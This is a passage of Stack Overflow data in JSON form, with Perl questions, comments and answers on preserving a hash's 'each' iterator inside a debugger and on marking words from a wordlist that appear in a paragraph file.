building the following code ,however it gives me an arbitrary result with every word followed by \" CC \".</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = 'file1.txt';\n\nopen(my $word_fh,\"file1.txt\") or die \"Couldn't open file file1.txt, $!\";\n\nmy %word_match = map {chomp $_; $_ =&gt; 0} &lt;$word_fh&gt;;\n\nclose $word_fh;\n\n\nopen my $fh, '&lt;', $file or die $!;\n\nwhile (&lt;$fh&gt;){\n    chomp;\n\n    my @words_in_line = split;\n\n    for my $word (@words_in_line){\n\n        $word =~ /ing$/;\n        $word .= '  CC' if exists $word_match{$word};\n\n         print \"    $word\\n\";\n    }\n    }\n</code></pre>\n\n<p>The output that I get is this :</p>\n\n<pre><code>cats    CC\nand CC\ndogs    CC\nare CC\nrunning CC\naround  CC\n|   CC\njohn    CC\nloves   CC\nmary    CC\n|   CC\nI   CC\nam  CC\nswimming\n|   CC\n</code></pre>\n\n<p>I know I am doing something wrong. Any hints or suggestions would be appreciated. Thanks in advance !</p>\n"}, {"tags": ["perl", "intellij-idea", "hash", "iterator", "each"], "comments": [{"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 2, "creation_date": 1466321059, "post_id": 37904606, "comment_id": 63262297, "body": "Why don&#39;t you change your code example to what you are actually trying to do."}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466321327, "post_id": 37904606, "comment_id": 63262343, "body": "If you&#39;ll read question completely, you&#39;ll see what i&#39;m trying to do."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466322476, "post_id": 37904606, "comment_id": 63262591, "body": "Why don&#39;t you just capture <code>@keys = keys %hash; @values = values %hash;</code> before your loop and refer to those."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466322577, "post_id": 37904606, "comment_id": 63262603, "body": "Your debugger should not break your code.  Perhaps use another debugging tool?"}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "reply_to_user": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 1, "creation_date": 1466323942, "post_id": 37904606, "comment_id": 63262901, "body": "I&#39;m debugger author. Not code author. And it should not, but it does. Guess that default console debugger do the same thing if you&#39;ll try to dump hash while inside the each loop."}, {"owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "edited": false, "score": 1, "creation_date": 1466325769, "post_id": 37904606, "comment_id": 63263273, "body": "Note: Question cross-posted to PerlMonks at <a href=\"http://www.perlmonks.org/?node_id=1166063\" rel=\"nofollow noreferrer\">perlmonks.org/?node_id=1166063</a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466329862, "post_id": 37904606, "comment_id": 63264192, "body": "Did you try copying it into an array?  If having an array copy helps,I am not sure what exactly this with debugger entails."}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 0, "creation_date": 1466330995, "post_id": 37904606, "comment_id": 63264464, "body": "As written in question - copying breaks it too. Read the question to understand how it related to the debugger"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466358021, "post_id": 37904606, "comment_id": 63272068, "body": "<i>&quot;I&#39;m debugger author. Not code author.&quot;</i> Then I think your question is misleading. You should open a new question, beginning with <i>I am writing a debugger, and ...</i>. Your <i>&quot;In case of...&quot;</i> paragraph is dense and over-informative, and many people will have overlooked it. I would have thought <a href=\"https://metacpan.org/pod/Hash::SafeKeys\" rel=\"nofollow noreferrer\"><code>Hash::SafeKeys</code></a> (as described in your final link) was exactly what you are looking for"}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 0, "creation_date": 1466362478, "post_id": 37904606, "comment_id": 63273301, "body": "I guess that question is ok and title is all about my question. It&#39;s not about &quot;how iterate a hash and copy it&quot;, but it&#39;s &quot;how to peek a hash without altering iterator&quot;"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1466362496, "post_id": 37904606, "comment_id": 63273307, "body": "@AlexandrEvstigneev  I did read your question. It doesn&#39;t even state what you want -- how to use a hash in the presence of a broken debugger, or how to fix the debugger itself? You cannot have a problem if you iterate over the <i>list</i> (immutable) since it&#39;s generated upfront, see Borodin&#39;s answer. On the other hand, perhaps the tool is too zealous -- Why is it querying the whole hash inside the loop? The &quot;<i>current lexical variables</i>&quot; is one element <i>inside</i> the loop block. That&#39;s just how hashes are, concurrent use of any of these functions with another won&#39;t work well."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466363069, "post_id": 37904606, "comment_id": 63273473, "body": "@ I don&#39;t see how this &quot;<i>question is easier</i>&quot; -- once you &quot;look&quot; you can copy. If this is indeed about the debugger I think you&#39;d have to get under the hood, or use a module that does so."}, {"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466363160, "post_id": 37904606, "comment_id": 63273501, "body": "@zdim I guess this is problem of my bad English. Updated the title and question to be more specific. Also updated code"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466370704, "post_id": 37904606, "comment_id": 63275661, "body": "@AlexandrEvstigneev: You mustn&#39;t edit your question so that it makes nonsense of the answers and comments that have been offered. As I said in my comment above, <i>&quot;You should open a new question&quot;</i>. Many hundreds of people will arrive at this page because their problem is like what you describe, and it is those people that Stack Overflow is built for. I will roll back your question shortly"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466371249, "post_id": 37904606, "comment_id": 63275840, "body": "@AlexandrEvstigneev: Please don&#39;t use <code>peek</code>. It means something very specific in some circumstances, and very little in most. In my vocabulary it represents a <a href=\"https://en.wikipedia.org/wiki/PEEK_and_POKE\" rel=\"nofollow noreferrer\">language function</a> that offers access to data by memory address using subterfuge. Since then we have invented virtual memory, and you should describe much better what you mean."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466372664, "post_id": 37905034, "comment_id": 63276238, "body": "You need to write something more to explain how this helps your situation"}], "tags": [], "owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "is_accepted": false, "score": 2, "last_activity_date": 1466322213, "creation_date": 1466322213, "answer_id": 37905034, "question_id": 37904606, "link": "https://stackoverflow.com/questions/37904606/access-a-hash-from-debugger-code-without-breaking-the-programs-each-iterator/37905034#37905034", "title": "Access a hash from debugger code without breaking the program&#39;s &quot;each&quot; iterator", "body": "<p>One solution for this is <a href=\"https://metacpan.org/pod/Hash%3A%3AStoredIterator\" rel=\"nofollow\">Hash::StoredIterator</a> module</p>\n"}, {"comments": [{"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 1, "creation_date": 1466362352, "post_id": 37909305, "comment_id": 63273270, "body": "If you&#39;ll read question and comments, you&#39;ll see that i&#39;m not author of code, i&#39;m author of debugger. So I can&#39;t modify code, i just need to made debugger not breaking the iterator"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 1, "creation_date": 1466372773, "post_id": 37909305, "comment_id": 63276270, "body": "@AlexandrEvstigneev: That isn&#39;t a satisfactory answer. Your question has deceived many people in addition to myself"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 1, "creation_date": 1466380395, "post_id": 37909305, "comment_id": 63277793, "body": "@AlexandrEvstigneev  But that is precisely the first problem with the question, that it asks about the code, not the debugger. I appreciate that you may have not meant that, but the question as originally posted states that. You say in this comment how <i>i just need to made debugger not breaking the iterator</i> -- until a recent edit of the question this is the only such statement.  Please re-read your <i>original</i> question."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1466382127, "last_edit_date": 1466382127, "creation_date": 1466353112, "answer_id": 37909305, "question_id": 37904606, "link": "https://stackoverflow.com/questions/37904606/access-a-hash-from-debugger-code-without-breaking-the-programs-each-iterator/37909305#37909305", "title": "Access a hash from debugger code without breaking the program&#39;s &quot;each&quot; iterator", "body": "<h3>Update</h3>\n\n<p>Please note that the OP's question was meant to ask how to interrogate the values of variables within a running Perl program from within a debugger, presumably invoked using the <code>-d</code> switch</p>\n\n<p>This solution won't help with that, but it does help with the apparent problem whereby <code>each</code> has a couple of issues and mustn't be used unless you are <em>certain</em> that your <code>while</code> loop will run to completion</p>\n\n<p><em>Reini Urban's</em> <a href=\"http://blogs.perl.org/users/rurban/2014/04/do-not-use-each.html)\" rel=\"nofollow\"><em>Do not use each</em></a> addresses this well</p>\n\n<p><br/></p>\n\n<hr>\n\n<p>Use a <code>for</code> loop over the <code>keys</code> list</p>\n\n<p><code>keys</code> in a list context returns a complete immutable list of the hash keys that won't be affected by anything</p>\n\n<p>If you replace</p>\n\n<pre><code>while ( my ( $key, $value ) = each %hash ) {\n    ...\n}\n</code></pre>\n\n<p>with</p>\n\n<pre><code>for my $key ( keys %hash ) {\n    my $value = $hash{$key};\n\n    ...\n}\n</code></pre>\n\n<p>then everything will work as you expect</p>\n"}, {"comments": [{"owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "edited": false, "score": 0, "creation_date": 1466589845, "post_id": 37912133, "comment_id": 63375929, "body": "Small addition about SafeKeys. It&#39;s slow and speed depends on the hash size; Tried to calculate keys number in 5k pairs hash 100k times: StoredIterator + default keys did it less than a second. SafeKeys took 46 seconds."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466372540, "last_edit_date": 1495542400, "creation_date": 1466372540, "answer_id": 37912133, "question_id": 37904606, "link": "https://stackoverflow.com/questions/37904606/access-a-hash-from-debugger-code-without-breaking-the-programs-each-iterator/37912133#37912133", "title": "Access a hash from debugger code without breaking the program&#39;s &quot;each&quot; iterator", "body": "<p>You say you've seen the question <a href=\"https://stackoverflow.com/questions/10921221/can-i-copy-a-hash-without-resetting-its-each-iterator\"><em>Can I copy a hash without resetting its \"each\" iterator?</em></a>, and I think there's nothing wrong with the answer there</p>\n\n<p>I think <a href=\"https://metacpan.org/pod/Hash::SafeKeys\" rel=\"nofollow noreferrer\"><code>Hash::SafeKeys</code></a> is exactly what you want. It is written using Perl XS (C code) and should be plenty fast enough for a command-line program</p>\n"}], "owner": {"reputation": 723, "user_id": 4568433, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-A0ltyCE72fA/AAAAAAAAAAI/AAAAAAAAADY/4U7GU992t_E/photo.jpg?sz=128", "display_name": "Alexandr Evstigneev", "link": "https://stackoverflow.com/users/4568433/alexandr-evstigneev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 183, "favorite_count": 2, "closed_date": 1466372838, "answer_count": 3, "score": 3, "last_activity_date": 1466382127, "creation_date": 1466318243, "last_edit_date": 1495535328, "question_id": 37904606, "link": "https://stackoverflow.com/questions/37904606/access-a-hash-from-debugger-code-without-breaking-the-programs-each-iterator", "closed_reason": "Duplicate", "title": "Access a hash from debugger code without breaking the program&#39;s &quot;each&quot; iterator", "body": "<p>I have a problem with accessing hash elements without breaking Perl's <code>each</code> iterator. </p>\n\n<p>According to <a href=\"http://perldoc.perl.org/functions/each.html\" rel=\"nofollow noreferrer\"><code>perldoc</code></a>, using keys or values on a hash variable resets the hash's internal iterator, used by <a href=\"http://perldoc.perl.org/functions/keys.html\" rel=\"nofollow noreferrer\"><code>keys</code></a>, <a href=\"http://perldoc.perl.org/functions/values.html\" rel=\"nofollow noreferrer\"><code>values</code></a> and <a href=\"http://perldoc.perl.org/functions/each.html\" rel=\"nofollow noreferrer\"><code>each</code></a>. But it looks like simply copying the hash, as using something like </p>\n\n<pre><code>%other_hash = %hash\n</code></pre>\n\n<p>also resets the hash's iterator.</p>\n\n<p>For example:</p>\n\n<pre><code>my %hash = ( 'A' .. 'D' );\n\nmy $n;\n\nwhile ( my ( $key, $value ) = each %hash ) {\n\n    my %otherhash = %hash;\n\n    print \"$key=$value\\n\";\n\n    last unless ++$n &lt; 5;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>C=D\nC=D\nC=D\nC=D\nC=D\n</code></pre>\n\n<p>I am writing a debugger which must provide variables' values to the IDE on each <em>step in</em> or <em>step over</em>. In case of hashes the debugger must be able to send the number of elements their values.</p>\n\n<p>I've seen <a href=\"https://stackoverflow.com/questions/10921221/can-i-copy-a-hash-without-resetting-its-each-iterator\"><em>Can I copy a hash without resetting its \"each\" iterator?</em></a>.</p>\n"}, {"tags": ["perl", "compare", "pattern-matching"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466268817, "post_id": 37899315, "comment_id": 63251883, "body": "is your &quot;paragraph&quot; file really one word per line?"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1466272459, "post_id": 37899315, "comment_id": 63253020, "body": "For the future, please be more thoroughly when posting. The question itself is not bad and I appreciate that you <code>use strict</code> and <code>use warnings</code> but you only pretend to: your script doesn&#39;t compile as it is. Also the output shown does not reflect your actual output because Data::Dumper uses far more curlies <code>{}</code> and arrows <code>=&gt;</code> than we can see here."}, {"owner": {"reputation": 3, "user_id": 6431338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5d1da9ec86105ee8c5014657370d17c?s=128&d=identicon&r=PG&f=1", "display_name": "Dev", "link": "https://stackoverflow.com/users/6431338/dev"}, "edited": false, "score": 0, "creation_date": 1466273740, "post_id": 37899315, "comment_id": 63253425, "body": "My bad for the incompleteness. I actually used a for loop to cleanse the data dumper output ,like this :                                                                           print  $_, $/ for (sort{$a_fh cmp $b_fh} keys %{$result});"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466278861, "post_id": 37899315, "comment_id": 63254898, "body": "The Perl code that you show won&#39;t compile for a number of reasons. It certainly doesn&#39;t produce the output that you say it does. There is no point at all in asking a question unless you show your real code and data"}, {"owner": {"reputation": 3, "user_id": 6431338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5d1da9ec86105ee8c5014657370d17c?s=128&d=identicon&r=PG&f=1", "display_name": "Dev", "link": "https://stackoverflow.com/users/6431338/dev"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466280244, "post_id": 37899315, "comment_id": 63255245, "body": "@Borodin thankyou for your reply,but to surprise my initial code actually compiled and executed fine ,just that it was giving an output in the format var { &#39;Laura | MATCH&#39; =&gt;1 \\n &#39;Samuel |MATCH&#39; =&gt;2 ..... } and i cleansed it using the code $_, $/ for (sort{$a_fh cmp $b_fh} keys %{$result}); . But I am all good now. thanks again"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466280661, "post_id": 37899315, "comment_id": 63255352, "body": "@Dev: I apologise if it was my mistake. Your current question <i>does</i> compile, and the output is this <code>Use of uninitialized value $_ in scalar chomp at E:\\Perl\\source\\paras.pl line 25, &lt;$b_fh&gt; line 1. Use of uninitialized value $_ in pattern match (m&#47;&#47;) at E:\\Perl\\source\\paras.pl line 27, &lt;$b_fh&gt; line 1. Use of uninitialized value $_ in scalar chomp at E:\\Perl\\source\\paras.pl line 25, &lt;$b_fh&gt; line 2. Use of uninitialized value $_ in pattern match (m&#47;&#47;) at E:\\Perl\\source\\paras.pl line 27, &lt;$b_fh&gt; line 2. Use of uninitialized value $_ in scalar chomp at E:\\Perl\\source\\paras.pl ...</code>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3, "user_id": 6431338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5d1da9ec86105ee8c5014657370d17c?s=128&d=identicon&r=PG&f=1", "display_name": "Dev", "link": "https://stackoverflow.com/users/6431338/dev"}, "edited": false, "score": 0, "creation_date": 1466280332, "post_id": 37899677, "comment_id": 63255265, "body": "@Dev: Please remember that all Stack Overflow pages are important because of the traffic they will will get <i>after</i> you have your answer. Your question shows code that doesn&#39;t even compile, and certainly doesn&#39;t produce the output that you say it does. That is very selfish of you, and is no help to anyone else who might come across your question in the hope of a solution. Please be more considerate in the future"}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": true, "score": 2, "last_activity_date": 1466273148, "last_edit_date": 1466273148, "creation_date": 1466270307, "answer_id": 37899677, "question_id": 37899315, "link": "https://stackoverflow.com/questions/37899315/perl-program-to-find-matching-words-in-a-paragraph/37899677#37899677", "title": "Perl program to find matching words in a paragraph", "body": "<p>Here's one example, which allows doing multiple files. I populate an array <code>@files</code> with the files I want to compare, then I read in the wordlist file and put them all into a hash, then  iterate over the paragraph files one line at a time. I then separate all the words on each line, and print them, but only after checking whether the word is in wordlist. If it is, I print it with \" | MATCH\".</p>\n\n<p>Paragraph file 1:</p>\n\n<pre><code>Laura is about to meet Gerry, and is planning to take Peter along.\n\nBut Peter and Sarah have other plans.\n</code></pre>\n\n<p>Paragraph file 2:</p>\n\n<pre><code>Blah Peter has lost it.\n</code></pre>\n\n<p>The code:</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy @files = ('file.txt', 'file2.txt');\n\nopen my $word_fh, '&lt;', 'wordlist.txt' or die $!;\n\nmy %words_to_match = map {chomp $_; $_ =&gt; 0} &lt;$word_fh&gt;;\n\nclose $word_fh;\n\ncheck($_) for @files;\n\nsub check {\n    my $file = shift;\n\n    open my $fh, '&lt;', $file or die $!;\n\n    while (&lt;$fh&gt;){\n        chomp;\n        my @words_in_line = split;\n\n        for my $word (@words_in_line){\n            $word =~ s/[\\.,;:!]//g;\n            $word .= ' | MATCH' if exists $words_to_match{$word};\n            print \"    $word\\n\";\n        }\n        print \"\\n\";\n    }\n}    \n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Laura | MATCH\nis\nabout\nto\nmeet\nGerry | MATCH\nand\nis\nplanning\nto\ntake\nPeter | MATCH\nalong\nBut\nPeter | MATCH\nand\nSarah\nhave\nother\nplans\n\nBlah\nPeter | MATCH\nhas\nlost\nit\n</code></pre>\n\n<p>If you want to print it to a file, open a write file handle, and change the <code>print</code> statement inside the while loop to <code>print $wfh ...</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 0, "last_activity_date": 1466271145, "creation_date": 1466271145, "answer_id": 37899810, "question_id": 37899315, "link": "https://stackoverflow.com/questions/37899315/perl-program-to-find-matching-words-in-a-paragraph/37899810#37899810", "title": "Perl program to find matching words in a paragraph", "body": "<p>I think you didn't get the desired output because you stuffed it into the hash <code>$result</code> and then printed that with <code>Data::Dumper</code>.\n<code>Data::Dumper</code> will print a hash in an arbitrary order, especially if you set <code>$Data::Dumper::Sortkeys=0</code>.</p>\n\n<p>I changed your code a bit so the output is written as soon as it's read from File2.txt and when it's clear whether there was a match or not.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nmy $result      = {};\nmy $first_file  = shift || 'File1.txt';\nmy $second_file = shift || 'File2.txt';\nmy $output      = 'output2.txt';\nopen my $a_fh, '&lt;', $first_file  or die \"$first_file: $!\";\nopen my $b_fh, '&lt;', $second_file or die \"$second_file: $!\";\nopen( my $out, '&gt;', $output ) or die \"Cannot create $output.\\n\";\n\n# remember words from File1.txt in the hash $result:\nwhile ( my $line = &lt;$a_fh&gt; ) {\n    $line =~ s/^\\s*//;    # strip leading whitespace\n    $line =~ s/\\s*$//;    # strip trailing ws\n    next if $line =~ /^$/;    # skip now empty lines\n    $result-&gt;{$line} = 1;\n}\n\n# now $result consists of all \"words\" in File1.txt, like\n# $result = {\n#   'Gerry'  =&gt; 1,\n#   'Laura'  =&gt; 1,\n#   'Maggie' =&gt; 1,\n#   'Peter'  =&gt; 1,\n#   'Samuel' =&gt; 1\n# };\n\n# now iterate over File2.txt, print all lines and append\n# 'MATCH' for those in File1.txt:\nwhile ( my $line = &lt;$b_fh&gt; ) {\n    $line =~ s/^\\s*//;        # strip leading whitespace\n    $line =~ s/\\s*$//;        # strip trailing ws\n    next if $line =~ /^$/;    # skip now empty lines\n\n    # print the line from File2.txt (without \\n):\n    print $out $line;\n\n    # if this line (word) was found\n    # in File1.txt, then append \" | MATCH\"\n    if ( $result-&gt;{$line} ) {\n        print $out ' | MATCH';\n    }\n\n    # print final \\n\n    print $out \"\\n\";\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Laura | MATCH\nis\nabout\nto\nmeet\nGerry | MATCH\nand\nis\nplanning\nto\ntake\nPeter | MATCH\nalong\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6431338, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5d1da9ec86105ee8c5014657370d17c?s=128&d=identicon&r=PG&f=1", "display_name": "Dev", "link": "https://stackoverflow.com/users/6431338/dev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 533, "favorite_count": 0, "accepted_answer_id": 37899677, "answer_count": 2, "score": -1, "last_activity_date": 1466315561, "creation_date": 1466268049, "last_edit_date": 1592644375, "question_id": 37899315, "link": 